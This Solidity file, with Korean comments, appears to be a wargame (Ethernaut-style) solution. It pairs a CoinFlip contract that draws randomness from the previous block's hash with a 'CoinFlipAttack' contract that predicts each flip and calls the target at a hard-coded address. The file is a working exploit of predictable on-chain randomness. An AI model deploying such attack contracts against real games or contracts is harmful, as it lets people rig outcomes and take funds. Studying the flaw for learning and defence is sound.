// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1)); //solidity에서 blockhash, block.number 등을 이용해 블록 정보를 가져올 수 있음

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue; // 마지막 해시값 업데이트
        uint256 coinFlip = blockValue / FACTOR; // 블록 해시값을 FACTOR로 나누어 0 또는 1 생성 keccak-256사용, 32바이트 FACTOR는 최댓값의 절반임 즉 1/2확률!
        bool side = coinFlip == 1 ? true : false; // 1이면 true, 0이면 false

        if (side == _guess) { 
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

//해킹 컨트랙트

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// CoinFlip 컨트랙트의 인터페이스 정의
interface ICoinFlip {
    function flip(bool guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttack {
    ICoinFlip target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    // 이벤트로 결과 기록
    event AttackResult(bool guess, bool result, uint256 consecutiveWins);
    
    constructor() {
        target = ICoinFlip(0x1bAf050d551937d2640BcbED91ddD152f18a18aa);
    }
    
    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false; //여기서 미리 예측된 결과 생성
        
        // flip 함수 호출
        bool result = target.flip(guess); 

        return result;
    }
    
    // 현재 연속 승수만 확인하는 함수
    function getWins() public view returns (uint256) {
        return target.consecutiveWins();
    }
    
}